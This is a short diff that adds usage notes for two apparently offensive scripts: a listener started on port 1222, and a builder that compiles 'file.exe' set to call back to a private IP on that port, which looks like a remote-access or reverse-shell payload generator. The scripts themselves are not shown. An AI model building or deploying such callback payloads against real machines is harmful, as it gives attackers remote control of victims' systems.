@@ -1,0 +1,5 @@
+listening COmmand:
+python3 listen.py -p 1222
+
+compile command:
+python3 builder.py --ip 192.168.187.129  --port 1222 --output file.exe
